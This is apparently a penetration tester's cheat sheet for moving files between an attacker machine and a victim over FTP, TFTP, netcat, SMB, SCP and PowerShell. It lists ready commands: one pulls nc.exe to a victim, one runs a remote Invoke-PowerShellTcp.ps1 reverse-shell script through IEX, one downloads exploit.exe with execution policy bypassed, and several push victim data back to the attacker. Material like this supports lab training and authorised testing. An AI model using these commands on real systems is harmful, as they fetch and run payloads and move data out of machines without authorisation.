#Curl and wget obviously
#Base64
cat file.transfer | base64 -w 0 
echo base64blob | base64 -d > file.transfer
#FTP
pip install pyftpdlib
python -m pyftpdlib -p 21 -w
#TFTP
service atftpd start
atftpd --daemon --port 69 /tftp
/etc/init.d/atftpd restart
auxiliary/server/tftp
## one-liner to pull from attacker (FTP server) to victim
```
echo open 10.10.14.17>ftp_commands.txt&echo anonymous>>ftp_commands.txt&echo password>>ftp_commands.txt&echo binary>>ftp_commands.txt&echo get nc.exe>>ftp_commands.txt&echo bye>>ftp_commands.txt
```
then `ftp -s:ftp_commands.txt `
you can exfiltrate mutliple files via...
` prompt ` (turn that annoyance off)
` mget * ./` or `mput *.txt`
or recursively pull with wget
`wget ftp://10.11.0.74/exploits/unix/CVE-2009-1894/* ---ftp-user=anonymous --ftp-password=""`

# mount point method
ref: http://www.ducea.com/2006/07/27/allowing-ftp-access-to-files-outside-the-home-directory-chroot/ 
` mkdir priv-esc-unix `
` mount --bind /root/priv-esc/unix/ priv-esc-unix `

#netcat
nc -lvnp 443 < filetotransfer.txt
nc <ip> 443 > filetransfer.txt 

#PHP
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
#SCP Copy a file:
scp /path/to/source/file.ext username@192.168.1.101:/path/to/destination/file.ext
#SCP  Copy a directory:
scp -r /path/to/source/dir username@192.168.1.101:/path/to/destination


# SFTP Server 
```
openssl req -out CSR.csr -new -newkey rsa:2048 -nodes -keyout /tmp/test_rsa.key
sftpserver -k CSR.csr
```
Connecting from victim
```
sftp sshuser@10.11.0.50
mput *.txt
```
# SMB
` smbserver.py <NAME> <location> `
windows smb client can verify, execute and more
dir/copy/move are useful commands
`net view \\10.11.0.192\` to search box for server
`copy \\10.11.0.192\ROPNOP\nc.exe`

File Explorer
`\\192.168.1.146\ropnop`

CD or Set-location in Powershell
`set-location \\192.168.1.146\ROPNOP\`

Pipe output to the smbshare
`netstat -ano > \10.10.14.17\ROPNOP\netstat.txt`

## Mount SMB Share with Powershell
mounting it from the victim side
this now allows ups to cd into the dir
```
New-PSDrive -Name "squidling" -PSProvider "FileSystem" -Root "\\10.11.0.74\ROPNOP"
cd squidling:\
```


## POWERSHELL
keep in mind you can always also use a browser if you have gui
[/]https://www.abatchy.com/2017/03/powershell-download-file-one-liners[/]

can run this as single command from cmd but best done with ncat.exe so it doesn't crap out
`Powershell (new-object System.Net.WebClient).DownloadFile('http://10.10.14.17/http.nmap','C:\temp\http.nmap')`

Invoke a ps1 script directly being served from my HTTP server
`powershell "IEX(New-Object Net.Webclient).DownloadString('http://10.10.14.17/Invoke-PowerShellTcp.ps1')"`

For newer powershell versions use this for downloading a binary
`Invoke-WebRequest "http://192.168.24.31/shell449.dll" -Outfile "custom7.dll"`

CMD
```
"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/exploit.exe\", "C:\Users\Public\Downloads\exploit.exe")"
```

## BASH
Send/Upload Files HTTP Server
https://www.youtube.com/watch?v=7ifJOon5-G8&t=1189s

nginx listener is needed with WebDav PUT method enabled
`/etc/nginx`
Configuration files are used as symbolic links(/etc/nginx/sites-enabled) from `/etc/nginx/sites-available`
config file used is `/etc/nginx/sites-available/file_upload`
server port is currently 6021
files get uploaded to `/var/www/upload`
`service nginx start`

Using powershell to upload a file
`Invoke-RestMethod -Method PUT -Uri "http://10.10.14.17:6021/Applocker.xml" -Body $output`

Using Curl to upload a file
`curl --upload-file smb.nmap 127.0.0.1:6021`

# SCP

Put multiple files from remote target
https://stackoverflow.com/questions/30553428/copying-files-from-server-to-local-computer-using-ssh
`scp *.txt carrie@10.1.1.236:/home/carrie/`

Put file on remote target
`scp -P 222 /home/carrie/passwd mario@10.1.1.1:/home/mario/passwd`


